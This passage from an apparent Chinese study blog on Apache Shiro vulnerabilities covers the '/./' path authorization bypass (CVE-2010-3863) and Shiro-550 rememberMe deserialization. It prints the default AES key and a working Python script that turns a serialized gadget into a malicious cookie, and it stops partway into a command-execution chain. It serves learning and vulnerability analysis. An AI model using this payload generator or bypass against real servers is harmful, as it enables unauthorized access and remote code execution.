+<pre class="language-ini" data-language="ini"><code class="language-ini">[urls]
+&#x2F;index &#x3D; anon
+&#x2F;user&#x2F;** &#x3D; authc
+&#x2F;admin&#x2F;** &#x3D; authc, roles[administrator]
+&#x2F;audit&#x2F;** &#x3D; authc, perms[&quot;remote:invoke&quot;]</code></pre>
+
+<p>简单来说，就是一个 Ant 风格的路径表达式与需要处理他的 Filter 之间的映射。Shiro 使用 <code>org.apache.shiro.web.filter.mgt.FilterChainManager</code> 自己维护一套 FilterChain 的机制，用来依次对多个 Filter 进行校验。</p>
+<p>Shiro 默认提供了一些 Filter，名称及对应处理类如下表格，如果想深入理解某个 Filter 功能的具体实现，可以具体查看。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Filter 名称</th>
+<th align="left">对应类</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">anon</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/AnonymousFilter.html">org.apache.shiro.web.filter.authc.AnonymousFilter</a></td>
+</tr>
+<tr>
+<td align="left">authc</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/FormAuthenticationFilter.html">org.apache.shiro.web.filter.authc.FormAuthenticationFilter</a></td>
+</tr>
+<tr>
+<td align="left">authcBasic</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/BasicHttpAuthenticationFilter.html">org.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter</a></td>
+</tr>
+<tr>
+<td align="left">authcBearer</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/BearerHttpAuthenticationFilter.html">org.apache.shiro.web.filter.authc.BearerHttpAuthenticationFilter</a></td>
+</tr>
+<tr>
+<td align="left">invalidRequest</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/InvalidRequestFilter.html">org.apache.shiro.web.filter.InvalidRequestFilter</a></td>
+</tr>
+<tr>
+<td align="left">logout</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/LogoutFilter.html">org.apache.shiro.web.filter.authc.LogoutFilter</a></td>
+</tr>
+<tr>
+<td align="left">noSessionCreation</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/session/NoSessionCreationFilter.html">org.apache.shiro.web.filter.session.NoSessionCreationFilter</a></td>
+</tr>
+<tr>
+<td align="left">perms</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/PermissionsAuthorizationFilter.html">org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter</a></td>
+</tr>
+<tr>
+<td align="left">port</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/PortFilter.html">org.apache.shiro.web.filter.authz.PortFilter</a></td>
+</tr>
+<tr>
+<td align="left">rest</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/HttpMethodPermissionFilter.html">org.apache.shiro.web.filter.authz.HttpMethodPermissionFilter</a></td>
+</tr>
+<tr>
+<td align="left">roles</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/RolesAuthorizationFilter.html">org.apache.shiro.web.filter.authz.RolesAuthorizationFilter</a></td>
+</tr>
+<tr>
+<td align="left">ssl</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/SslFilter.html">org.apache.shiro.web.filter.authz.SslFilter</a></td>
+</tr>
+<tr>
+<td align="left">user</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/UserFilter.html">org.apache.shiro.web.filter.authc.UserFilter</a></td>
+</tr>
+</tbody></table>
+<p>在请求访问到达 ShiroFilter 后，会根据 request 的信息，调用 <code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code> 方法匹配配置的 pathPattern 以及 requestURI，如果有匹配，则会添加一层 ProxiedFilterChain 代理。这里看到，如果 <code>pathMatches</code> 方法匹配，将会进行 return，因此配置的顺序也很重要。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641301764041.png" alt="img"></p>
+<p>也就是说，Shiro 不会向 Servlet Context 中添加其他的 Filter，而是使用嵌套 ProxiedFilterChain 代理的方式扩展 FilterChain，并在自身 Filter 都处理结束之后继续执行原 FilterChain。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641301141206.png" alt="img"></p>
+<p>这里简单说其实就是shiro在servlet的filter前面又套了一层filter，因此在调用的时候会先调shiro的filter，然后再调servlet自己的filter</p>
+<h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>在目前的环境下，越来越多的 Web 环境使用了 SpringBoot/SpringMVC 及相关生态，因此更多的时候会将 Shiro 集成配置在其中。为了应对此环境，Shiro 提供了 <code>shiro-spring</code> 包来进行配置。</p>
+<p>在 Servlet 项目中，是通过在 <code>web.xml</code> 中配置了能匹配所有 URL 路径 <code>/*</code> 的 ShiroFilter，并由其执行后续逻辑。而在 Spring 生态下，由于 IoC 与 DI 的思想，通常把所有的 Filter 注册成为 Bean 交给 Spring 来管理。</p>
+<p>此时如果想要将 Shiro 逻辑注入其中，就用到了关键类：<code>ShiroFilterFactoryBean</code>。这是 Shiro 为 Spring 生态提供的工厂类，由它在 spring 中承担了之前 ShiroFilter 的角色。内部类 SpringShiroFilter 继承了 AbstractShiroFilter，实现了类似的逻辑。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641350389722.png" alt="img"></p>
+<p>可以结合 <code>spring-web</code> 包中的 DelegatingFilterProxy 配置使用，其作用就是一个 filter 的代理，被它代理的 filter 将由 spring 来管理其生命周期。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641349677712.png" alt="img"></p>
+<p>ShiroFilterFactoryBean 还是 BeanPostProcessor 的子类，实现了对于 Filter 子类自动发现和处理的技术，所以我们可以通过配置 ShiroFilterFactoryBean 的方式来注册 SpringShiroFilter。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641362172288.png" alt="img"></p>
+<p>其他的配置也可以全部交由 Spring 管理，我们只需要对 ShiroFilterFactoryBean 进行配置即可，简单的示例代码如下：</p>
+<pre class="language-java" data-language="java"><code class="language-java">&#x2F;**
+ * @author su18
+ *&#x2F;
+@Configuration
+public class ShiroConfig &#123;
+
+	@Bean
+	MyRealm myRealm() &#123;
+		return new MyRealm();
+	&#125;
+
+	@Bean
+	RememberMeManager cookieRememberMeManager() &#123;
+		return new CookieRememberMeManager();
+	&#125;
+
+
+	@Bean
+	SecurityManager securityManager(MyRealm myRealm, RememberMeManager cookieRememberMeManager) &#123;
+		DefaultWebSecurityManager manager &#x3D; new DefaultWebSecurityManager();
+		manager.setRealm((Realm) myRealm);
+		manager.setRememberMeManager(cookieRememberMeManager);
+		return manager;
+	&#125;
+
+	@Bean(name &#x3D; &#123;&quot;shiroFilter&quot;&#125;)
+	ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager) &#123;
+		ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean();
+		bean.setSecurityManager(securityManager);
+		bean.setLoginUrl(&quot;&#x2F;index&#x2F;login&quot;);
+		bean.setUnauthorizedUrl(&quot;&#x2F;index&#x2F;unauth&quot;);
+		LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;();
+		map.put(&quot;&#x2F;index&#x2F;user&quot;, &quot;authc&quot;);
+		map.put(&quot;&#x2F;index&#x2F;**&quot;, &quot;anon&quot;);
+		map.put(&quot;&#x2F;audit&#x2F;**&quot;, &quot;authc, perms[\&quot;audit:list\&quot;]&quot;);
+		map.put(&quot;&#x2F;admin&#x2F;**&quot;, &quot;authc, roles[admin]&quot;);
+		map.put(&quot;&#x2F;logout&quot;, &quot;logout&quot;);
+		bean.setFilterChainDefinitionMap(map);
+		return bean;
+	&#125;
+&#125;</code></pre>
+
+
+
+<h1 id="安全漏洞"><a href="#安全漏洞" class="headerlink" title="安全漏洞"></a>安全漏洞</h1><p>这里是这篇文章的主要部分</p>
+<p>根据官方网站上的漏洞<a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">通报</a>，shiro 在历史上共通报了 11 个 CVE，其中包含认证绕过、反序列化等漏洞类型</p>
+<p>不过除了shiro550和shiro721，其他几个洞感觉全是路径解析造成的问题，所以可能就直接照抄参考文章了</p>
+<h2 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">CVE-2010-3863</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2010-2715">CNVD-2010-2715</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.1.0 &amp; JSecurity 0.9.x</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Shiro 在对请求路径与 shiro.ini 配置文件配置的 AntPath 进行对比前 未进行路径标准化，导致使用时可能绕过权限校验</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">/./ | 路径标准化</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL">https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL</a> <a target="_blank" rel="noopener" href="https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2">https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>（没找到对应版本，凑合看吧</p>
+<p>之前提到过，Shiro 使用 <code>PathMatchingFilterChainResolver#getChain</code> 方法获取和调用要执行的 Filter，逻辑如下：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641375097048.png" alt="img"></p>
+<p><code>getPathWithinApplication()</code> 方法调用 <code>WebUtils.getPathWithinApplication()</code> 方法，用来获取请求路径。通过如下逻辑可看到，方法获取 Context 路径以及 URI 路径，然后使用字符串截取的方式去掉 Context 路径。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230501215129579.png" alt="image-20230501215129579"></p>
+<p>获取 URI 路径的方法 <code>getRequestUri()</code> 获取 <code>javax.servlet.include.request_uri</code> 的值，并调用 <code>decodeAndCleanUriString()</code> 处理。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641376070079.png" alt="img"></p>
+<p><code>decodeAndCleanUriString()</code> 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 <code>;jsessionid</code> 之类的字符串的适配，对 <code>;</code> 进行了截取。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641376084763.png" alt="img"></p>
+<p>处理之后的请求 URL 将会使用 <code>AntPathMatcher#doMatch</code> 进行匹配尝试。</p>
+<p>流程梳理到这里就出现了一个重大的问题：在匹配之前，没有进行标准化路径处理，导致 URI 中如果出现一些特殊的字符，就可能绕过安全校验。比如如下配置：</p>
+<pre class="language-ini" data-language="ini"><code class="language-ini">[urls]
+&#x2F;user&#x2F;** &#x3D; authc
+&#x2F;admin&#x2F;list &#x3D; authc, roles[admin]
+&#x2F;admin&#x2F;** &#x3D; authc
+&#x2F;audit&#x2F;** &#x3D; authc, perms[&quot;audit:list&quot;]
+&#x2F;** &#x3D; anon</code></pre>
+
+<p>在上面的配置中，为了一些有指定权限的需求的接口进行了配置，并为其他全部的 URL <code>/**</code> 设置了 <code>anno</code> 的权限。在这种配置下就会产生校验绕过的风险。</p>
+<p>因为/./flag不会匹配到其中任何一个需要带权限访问的路径，因此就会导致成为了/**的anno权限，实现了越权访问</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">ab82949</a> 更新中添加了标准化路径函数。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641380817492.png" alt="img"></p>
+<p>对 <code>/</code>、<code>//</code>、<code>/./</code>、<code>/../</code> 等进行了处理。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641380876074.png" alt="img"></p>
+<h2 id="CVE-2014-0074"><a href="#CVE-2014-0074" class="headerlink" title="CVE-2014-0074"></a>CVE-2014-0074</h2><h3 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2014-0074</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2014-03861">CNVD-2014-03861</a> / <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-460">SHIRO-460</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro 1.x &lt; 1.2.3</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">当程序使用LDAP服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">ldap | 绕过 | 空密码 | 空用户名 | 匿名</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">Commit-f988846</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21391572/shiro-authenticates-non-existent-user-in-ldap">https://stackoverflow.com/questions/21391572/shiro-authenticates...in-ldap</a> <a target="_blank" rel="noopener" href="https://www.openldap.org/doc/admin24/security.html">https://www.openldap.org/doc/admin24/security.html</a></td>
+</tr>
+</tbody></table>
+<p>这个感觉利用条件跟shiro关系好像不是很大，先放一下，等以后学了ldap再说</p>
+<h2 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h2><h3 id="漏洞信息-2"><a href="#漏洞信息-2" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> / <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro 1.x &lt; 1.2.5</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">cookie | RememberMe | 反序列化 | 硬编码 | AES</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td>
+</tr>
+</tbody></table>
+<p>shiro的反序列化漏洞，算是shiro里比较重要的漏洞了</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_67401270/article/details/126721347">IDEA搭建shiro550复现环境_shiro550环境搭建_普通网友的博客-CSDN博客</a></p>
+<h3 id="漏洞详解-1"><a href="#漏洞详解-1" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>Shiro 从 0.9 版本开始设计了 RememberMe 的功能，用来提供在应用中记住用户登陆状态的功能。</p>
+<h4 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h4><p>首先是接口 <code>org.apache.shiro.mgt.RememberMeManager</code>，这个接口提供了 5 个方法：</p>
+<ul>
+<li><code>getRememberedPrincipals</code>：在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。</li>
+<li><code>forgetIdentity</code>：忘记身份标识。</li>
+<li><code>onSuccessfulLogin</code>：在登陆校验成功后调用，登陆成功时，保存对应的 principals 供程序未来进行访问。</li>
+<li><code>onFailedLogin</code>：在登陆失败后调用，登陆失败时，在程序中“忘记”该 Subject 对应的 principals。</li>
+<li><code>onLogout</code>: 在用户退出时调用，当一个 Subject 注销时，在程序中“忘记”该 Subject 对应的 principals。</li>
+</ul>
+<p>之前曾在 DefaultSecurityManager 的成员变量中见到了 RememberMeManager 成员变量，会在登陆、认证等逻辑中调用其中的相关方法。</p>
+<h4 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h4><p>同时，Shiro 还提供了一个实现了 <code>RememberMeManager</code> 接口的抽象类 <code>AbstractRememberMeManager</code>，提供了一些实现技术细节。先介绍其中重要的几个成员变量：</p>
+<ul>
+<li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个 Base64 的硬编码的 AES Key，也是本次漏洞的关键点，这个 key 会被同时设置为加解密 key 成员变量：encryptionCipherKey/decryptionCipherKey 。</li>
+<li><code>serializer</code>：Shiro 提供的序列化器，用来对序列化和反序列化标识用户身份的 PrincipalCollection 对象。</li>
+<li><code>cipherService</code>：用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。</li>
+</ul>
+<p>在其初始化时，会创建 <code>DefaultSerializer</code> 作为序列化器，<code>AesCipherService</code> 作为加解密实现类，<code>DEFAULT_CIPHER_KEY_BYTES</code> 作为加解密的 key。</p>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这就更容易触发RCE漏洞。<br>所以我们Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>然后我们可以下个断点跟一下 shiro里的Filter 处理流程</p>
+<p>调用链如下</p>
+<pre class="language-java" data-language="java"><code class="language-java">AbstractShiroFilter.doFilterInternal() 
+    AbstractShiroFilter.createSubject()
+        WebSubject.Builder.buildWebSubject()
+            Subject.Builder.buildSubject()
+                DefaultSecurityManager.createSubject()
+                    DefaultSecurityManager.resolvePrincipals()
+                        DefaultSecurityManager.getRememberedIdentity()
+                            AbstractRememberMeManager.getRememberedPrincipals()
+                                CookieRememberMeManager.getRememberedSerializedIdentity()</code></pre>
+
+<p>首先，filter流程肯定要调用<code>AbstractShiroFilter#doFilterInternal</code> 方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502163153001.png" alt="image-20230502163153001"></p>
+<p>然后去调用<code> AbstractShiroFilter.createSubject()</code>创建 Subject 对象</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502165433936.png" alt="image-20230502165433936"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502165550281.png" alt="image-20230502165550281"></p>
+<p>创建 Subject 对象后，会试图从利用当前的上下文中的信息来解析当前用户的身份，将会调用 <code>DefaultSecurityManager#resolvePrincipals</code> 方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502165615393.png" alt="image-20230502165615393"></p>
+<p>继续调用 <code>AbstractRememberMeManager#getRememberedPrincipals</code> 方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502172132028.png" alt="image-20230502172132028"></p>
+<p>这个方法就是将 SubjectContext 中的信息转为 PrincipalCollection 的关键方法，也是漏洞触发点。在 try 语句块中共有两个方法，分别是 <code>getRememberedSerializedIdentity</code> 和 <code>convertBytesToPrincipals</code> 方法。</p>
+<p>getRememberedSerializedIdentity我们之前提过这个方法，其实看名字也知道是读取序列化的用户信息，作用就是获取 Cookie 中的内容并 Base64 解码返回 byte 数组。</p>
+<p>然后这个返回的byte数组又传到了convertBytesToPrincipals方法里面进行处理</p>
+<p>在这个方法里，调用了一个解密和反序列化的方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502174748375.png" alt="image-20230502174748375"></p>
+<p>先看这个解密函数</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502174929737.png" alt="image-20230502174929737"></p>
+<p>跟一下这个<code>CipherService cipherService = getCipherService();</code>就能发现他是负责加密方式的，</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175143197.png" alt="image-20230502175143197"></p>
+<p>就是给一个aes的加密</p>
+<p>然后在这一行进行真正的加密操作</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175244034.png" alt="image-20230502175244034"></p>
+<p>看名字也能猜出来，一个放密文，一个放密钥</p>
+<p>密文肯定就是我们cookie里的东西，这个可以先不看，所以先看看密钥</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175337745.png" alt="image-20230502175337745"></p>
+<p>再往里跟会发现这个密钥其实是个常量</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175551924.png" alt="image-20230502175551924"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175604656.png" alt="image-20230502175604656"></p>
+<p>这就是shiro550最根本的漏洞原因</p>
+<p>由于对cookie内容的aes解密密钥采用的是固定值，因此我们可以通过获取这一密钥来修改cookie中的内容，使在之后的反序列化过程中反序列化我们构造的恶意cookie</p>
+<p>接下来再来看反序列化的过程</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175918159.png" alt="image-20230502175918159"></p>
+<p>这里就是调了一个原生的readObject，因此我们就可以去利用这一反序列化</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在漏洞利用之前还要说一点前提</p>
+<p>在shiro中，选择了remember登录后，系统会给出两个cookie，一个是JSESSIONID，另一个是rememberMe，而当JSESSIONID存在的时候，shiro可以直接通过<code>DefaultSecurityManager#resolvePrincipals</code> 方法判断用户的角色，因此用户角色不为空，也就不会进入到这个if判断里，从而就不会进入getRememberedIdentity，更别说去获取rememberMe的值进行解密和反序列化操作了。所以漏洞利用的时候构造完payload还要把JSESSIONID删了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502180258729.png" alt="image-20230502180258729"></p>
+<p>接下来是正式利用的部分</p>
+<p>我们先尝试着去进行java原生的反序列化，也就是urldns链</p>
+<h4 id="urldns链"><a href="#urldns链" class="headerlink" title="urldns链"></a>urldns链</h4><p>当我们成功登录时，可以看到返回的内容中存在很长一串cookie</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502180623950.png" alt="image-20230502180623950"></p>
+<p>首先生成一个urldns的payload文件</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181328618.png" alt="image-20230502181328618"></p>
+<p>aes加密脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">import sys
+import base64
+import uuid
+from random import Random
+from Crypto.Cipher import AES
+
+def get_file(filename):
+    with open(filename,&#39;rb&#39;) as f:
+        data &#x3D; f.read()
+    return data
+
+
+def aesEncode(data):
+    BS &#x3D; AES.block_size
+    pad &#x3D; lambda s: s + ((BS-len(s)%BS)) * chr(BS-len(s)%BS).encode()
+    key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;
+    mode &#x3D; AES.MODE_CBC
+    iv &#x3D; uuid.uuid4().bytes
+    encryptor &#x3D; AES.new(base64.b64decode(key),mode,iv)
+    ciphertext &#x3D; base64.b64encode(iv+encryptor.encrypt(pad(data)))
+    return ciphertext
+def aesDecode(enc_data):
+    enc_data &#x3D; base64.b64decode(enc_data)
+    unpad &#x3D; lambda s:s[:-s[-1]]
+    key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;
+    mode &#x3D; AES.MODE_CBC
+    iv &#x3D; enc_data[:16]
+    encryptor &#x3D; AES.new(base64.b64decode(key),mode,iv)
+    plaintext &#x3D; encryptor.decrypt(enc_data[16:])
+    plaintext &#x3D; unpad(plaintext)
+    return plaintext
+
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    data &#x3D; get_file(&quot;ser.bin&quot;)
+    print(aesEncode(data))</code></pre>
+
+<p>执行加密脚本生成payload</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181456556.png" alt="image-20230502181456556"></p>
+<p>修改rememberMe的值然后刷新一下提交，看看bp里就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181449872.png" alt="image-20230502181449872"></p>
+<p>调试一下也能看见</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181724431.png" alt="image-20230502181724431"></p>
+<p>反序列化的时候有了个HashMap，说明我们的URLDNS链成功调用了</p>
+<p>可是只能发起dns请求可还不够，我们的目的是命令执行</p>
+<h4 id="CB链无依赖打shiro550"><a href="#CB链无依赖打shiro550" class="headerlink" title="CB链无依赖打shiro550"></a>CB链无依赖打shiro550</h4><p>之前写CB链的那个文章也说了，就是专门为了shiro550才学的，所以这里直接用了（记得jdk版本改一改，一下午的教训</p>
+<p>这里也要注意一个问题，就是如果直接用CB那篇文章里的配置来打shiro550是不会成功的，在控制台可以看见这样的报错</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502182726959.png" alt="image-20230502182726959"></p>
+<p>这是因为shiro里自带的CB是1.8.3版本</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502182813089.png" alt="image-20230502182813089"></p>
+<p>而1.9+版本的CB修改了一些类的serialVersionUID，也就是java序列化的唯一标识，所以会报错</p>
